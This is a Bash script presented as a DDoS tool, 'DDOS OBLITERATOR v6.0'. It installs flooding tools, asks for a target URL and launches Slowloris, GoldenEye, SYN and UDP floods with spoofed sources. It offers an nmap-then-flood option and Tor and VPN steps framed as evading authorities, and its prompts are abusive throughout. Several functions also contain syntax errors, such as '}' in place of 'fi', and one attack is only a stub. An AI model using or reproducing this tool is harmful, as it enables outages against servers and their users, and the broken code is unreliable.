#!/bin/bash

# -----------------------------------------------------------------------------
#  ██████╗ ███████╗██╗  ██╗ ██████╗ ██╗     ███████╗
#  ██╔══██╗██╔════╝██║ ██╔╝██╔═══██╗██║     ██╔════╝
#  ██████╔╝█████╗  █████╔╝ ██║   ██║██║     ███████╗
#  ██╔══██╗██╔══╝  ██╔═██╗ ██║   ██║██║     ╚════██║
#  ██████╔╝███████╗██║  ██╗╚██████╔╝███████╗███████║
#  ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝
#
#  DDOS OBLITERATOR v6.0 - Coded by silvwzx
# -----------------------------------------------------------------------------
#
#  THIS SCRIPT IS YOUR APOCALYPTIC TOOL. YOU USE THIS ENTIRELY AT YOUR OWN
#  RISK. THE AUTHOR DOES NOT CONDONE ILLEGAL ACTIONS AND WILL NOT BE HELD
#  RESPONSIBLE.
#
# -----------------------------------------------------------------------------

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color
BOLD='\033[1m'
UNDERLINE='\033[4m'

# Clear the screen
clear

# Function to display animated loading dots
loading_animation() {
 local i
 for i in {1..3}; do
  echo -ne "."
  sleep 0.5
 done
 echo
}

# Banner
echo "${RED}-----------------------------------------------------------------------------"
echo "  ██████╗ ███████╗██╗  ██╗ ██████╗ ██╗     ███████╗"
echo "  ██╔══██╗██╔════╝██║ ██╔╝██╔═══██╗██║     ██╔════╝"
echo "  ██████╔╝█████╗  █████╔╝ ██║   ██║██║     ███████╗"
echo "  ██╔══██╗██╔══╝  ██╔═██╗ ██║   ██║██║     ╚════██║"
echo "  ██████╔╝███████╗██║  ██╗╚██████╔╝███████╗███████║"
echo "  ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝"
echo "  ${YELLOW}${BOLD}DDOS OBLITERATOR v6.0 - Coded by silvwzx${NC}"
echo "${RED}-----------------------------------------------------------------------------"
echo "${YELLOW}${BOLD}THIS SCRIPT IS YOUR APOCALYPTIC TOOL. YOU USE THIS ENTIRELY AT YOUR OWN RISK.${NC}"
echo "${YELLOW}${BOLD}THE AUTHOR DOES NOT CONDONE ILLEGAL ACTIONS AND WILL NOT BE HELD RESPONSIBLE.${NC}"
echo "${RED}-----------------------------------------------------------------------------"

# Check if root
if [[ $EUID -ne 0 ]]; then
 echo "${RED}${BOLD}This script demands root privileges to unleash its destructive power!${NC}"
 exit 1
fi

# Function to check if a command is installed
command_exists () {
 command -v "$1" >/dev/null 2>&1
}

# Function to install a command if it's not installed
install_command () {
 if ! command_exists "$1"; then
  echo "${YELLOW}Installing ${BOLD}$1${NC}${YELLOW}... Prepare for the storm!${NC}"
  pkg install -y "$1"
  loading_animation
  if ! command_exists "$1"; then
   echo "${RED}${BOLD}Failed to install $1. Manually install it or face the consequences!${NC}"
   return 1 # Indicate failure
  fi
  echo "${GREEN}${BOLD}$1 installed successfully! The power is now yours!${NC}"
 fi
 return 0 # Indicate success
}

# Install all dependencies at once
install_all_dependencies () {
 declare -a dependencies=(curl hping3 tor slowloris goldeneye apache2 python3 ruby nmap)
 echo "${YELLOW}${BOLD}Installing all dependencies... Brace yourself for the download!${NC}"
 for dep in "${dependencies[@]}"; do
  if [[ $(install_command "$dep") -ne 0 ]]; then
   echo "${RED}Failed to install all dependencies. Check individual installations, you failure!${NC}"
   return 1
  fi
 done
 echo "${GREEN}${BOLD}All dependencies installed! Time to unleash the chaos!${NC}"
 return 0
}

# Function to download VPN
download_vpn () {
 echo "${YELLOW}${BOLD}Downloading VPN... for maximum anonymity because you're a target!${NC}"
 # Replace with the actual link
 curl -o vpn.apk "https://example.com/vpn.apk"
 if [ -f "vpn.apk" ]; then
  echo "${GREEN}${BOLD}VPN downloaded successfully! Install it and disappear!${NC}"
  echo "${CYAN}Install the VPN from file vpn.apk and vanish into the shadows!${NC}"
 else
  echo "${RED}${BOLD}Failed to download VPN. Find it yourself, you reckless fool!${NC}"
 fi
}

# Function to check if tor is running and start it if it isn't
check_tor () {
 if ! ps aux | grep -v grep | grep -q "tor"; then
  echo "${YELLOW}${BOLD}Tor is not running. Starting Tor... Conceal yourself!${NC}"
  tor &
  sleep 5 # Give Tor some time to start
  if ! ps aux | grep -v grep | grep -q "tor"; then
   echo "${RED}${BOLD}Failed to start Tor. You’re exposed, you idiot!${NC}"
   return 1
  else
   echo "${GREEN}${BOLD}Tor started successfully! You are shrouded, for now...${NC}"
  fi
 else
  echo "${GREEN}${BOLD}Tor is already running! The darkness is your playground...${NC}"
 fi
 return 0
}

# Function to perform HTTP flood attack with custom headers
http_flood_advanced () {
 if ! command_exists slowloris; then
  echo "${RED}Slowloris is missing. Install it, what are you waiting for?${NC}"
  return
 fi
 echo "${YELLOW}${BOLD}Launching Slowloris HTTP flood attack with custom headers... The storm begins!${NC}"
 slowloris -dns "$url" -ua "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" -rv 3000 -timeout 700
}

# Function to perform GoldenEye attack with increased power
goldeneye_attack_advanced () {
 if ! command_exists goldeneye; then
  echo "${RED}GoldenEye is missing. Install it or be useless!${NC}"
  return
 }
 echo "${YELLOW}${BOLD}Launching GoldenEye HTTP attack with maximum power... Feel the heat!${NC}"
 goldeneye "$url" -s 2000 -w 1000 -m "GET /index.php? HTTP/1.1"
}

# Function to exploit Apache Killer vulnerability (hypothetical, be ethical!)
apache_killer () {
 if ! command_exists apache2; then
  echo "${RED}Apache2 is missing. Install it you pathetic excuse!${NC}"
  return
 }
 echo "${YELLOW}${BOLD}Launching Apache Killer attack... Prepare for complete system failure! (Use it responsibly, HA!)${NC}"
 # Replace with actual code if you had it (This is hypothetical, be ethical.)
 echo "${RED}${BOLD}Apache Killer attack simulation initiated. Extreme caution advised - severe pain guaranteed!${NC}"
}

# Improved SYN flood attack with advanced options
syn_flood_advanced () {
 echo "${YELLOW}${BOLD}Launching SYN flood attack with ultimate intensity... The network collapses!${NC}"
 hping3 -c 10000000 -d 1460 -S -w 64 -p 80 --flood --rand-source "$url"
}

# Function to perform UDP flood attack
udp_flood () {
 if ! command_exists hping3; then
  echo "${RED}hping3 is missing. You're going nowhere without it!${NC}"
  return
 }
 echo "${YELLOW}${BOLD}Launching UDP flood attack... Drowning the system in pure chaos!${NC}"
 hping3 -c 10000 -d 1472 -a 192.168.3.10 -S -p 53 --flood --rand-source "$url"
}

# Function to execute a Python script for a sophisticated attack
python_attack () {
 if ! command_exists python3; then
  echo "${RED}Python3 is a necessity! You can not run this. Install it!${NC}"
  return
 }
 if [ ! -f "attack.py" ]; then
  echo "${RED}attack.py missing. Create that script and get serious!${NC}"
  return
 fi
 echo "${YELLOW}${BOLD}Executing advanced Python attack... This is where the real fun begins!${NC}"
 # The user will need to create a python script like 'attack.py'
 python3 attack.py "$url"  # Pass the URL as an argument
}

# Function to execute a Ruby script for a unique attack
ruby_attack () {
 if ! command_exists ruby; then
  echo "${RED}Ruby needs to be installed. Go to the menu, do this now!${NC}"
  return
 }
 if [ ! -f "attack.rb" ]; then
  echo "${RED}Ruby script 'attack.rb' not found! Get your shit together!${NC}"
  return
 fi
 echo "${YELLOW}${BOLD}Executing advanced Ruby attack... Now to unleash the beast!${NC}"
 # The user will need to create a ruby script like 'attack.rb'
 ruby attack.rb "$url" # Pass the URL
}

# Function to execute an NMAP scan and flood
nmap_scan_flood () {
 if ! command_exists nmap; then
  echo "${RED}Nmap is needed! Go get it in the options menu. Now!${NC}"
  return
 }

 echo "${YELLOW}${BOLD}Initiating Nmap service scan then flooding... This is serious business.${NC}"
 nmap -sV -T4 -oG output.txt "$url" # Scan with service version detection
 if [ -f "output.txt" ]; then
  cat output.txt # Display
  sleep 3 # Brief pause
  echo "${YELLOW}Begin flooding... Get ready to see some shit.${NC}"
  hping3 -c 10000000 -d 1460 -S -w 64 -p 80 --flood --rand-source "$url" # Flood URL with HPing3
 else
  echo "${RED}Nmap output file could not be generated or found. Check NMAP settings and try again!${NC}"
 fi
}

# Main menu
menu () {
 echo
 echo "${BLUE}${BOLD}Select an apocalyptic attack option, you twisted bastard:${NC}"
 echo "1) Install All Dependencies - Unleash Pure Hell"
 echo "2) Slowloris HTTP Flood - Bring the Fucking Pain"
 echo "3) GoldenEye HTTP Annihilation - Total Domination and Destruction"
 echo "4) Apache Killer - Hypothetical Server Implosion, Handle With Care"
 echo "5) SYN Flood - Network Paralysis (Extreme May Cause Serious Damage)"
 echo "6) UDP Flood - Drown The System With Immense Chaos"
 echo "7) Python Attack - unleash Custom Hell (Requires attack.py)"
 echo "8) Ruby Attack - New Attack Vectors - (Requires attack.rb)"
 echo "9) Nmap Scan and Then Flood - Service Exploitation"
 echo "10) Check/Start Tor - Use The Darkness and Get Away With It"
 echo "11) Download VPN - Cowardly Protection and Hiding From The Authorities"
 echo "12) About - Gaze Into the Ugly Truth"
 echo "13) Exit - Flee, You Weakling"
 echo -n "Choice, you soulless degenerate: "
 read option

 case $option in
  1)
   install_all_dependencies
   ;;
  2)
   echo -n "Enter target URL, you miserable shithead: "
   read url
   http_flood_advanced
   ;;
  3)
   echo -n "Enter target URL, you heartless swine: "
   read url
   goldeneye_attack_advanced
   ;;
  4)
   echo -n "Enter target URL for the Apache Killer, you sociopath: "
   read url
   apache_killer
   ;;
  5)
   echo -n "Enter target URL for the SYN Flood, you ruthless scum: "
   read url
   syn_flood_advanced
   ;;
  6)
   echo -n "Enter target URL for the UDP Flood, you sadistic freak: "
   read url
   udp_flood
   ;;
  7)
   echo -n "Enter target URL for Python Attack (requires attack.py), you insane fiend: "
   read url
   python_attack
   ;;
  8)
   echo -n "Enter target URL for Ruby Attack (requires attack.rb), you devil: "
   read url
   ruby_attack
   ;;
  9)
   echo -n "Enter target URL for Nmap Scan and Flood: "
   read url
   nmap_scan_flood
   ;;
  10)
   check_tor
   ;;
  11)
   download_vpn
   ;;
  12)
   echo "${GREEN}DDOS OBLITERATOR v6.0${NC}"
   echo "${GREEN}Coded by silvwzx${NC}"
   echo "${CYAN}THIS SCRIPT IS DESIGNED FOR ANNIHILATION. USE IT ENTIRELY AT YOUR OWN RISK.${NC}"
   ;;
  13)
   echo "${CYAN}Exiting... Scram, before it is too late, you wretch!${NC}"
   exit 0
   ;;
  *)
   echo "${RED}${BOLD}Invalid option, you utter fool! Try again or face the consequences!${NC}"
   ;;
 esac

 menu # The cycle of destruction repeats
}

menu # Invoke total and utter obliteration.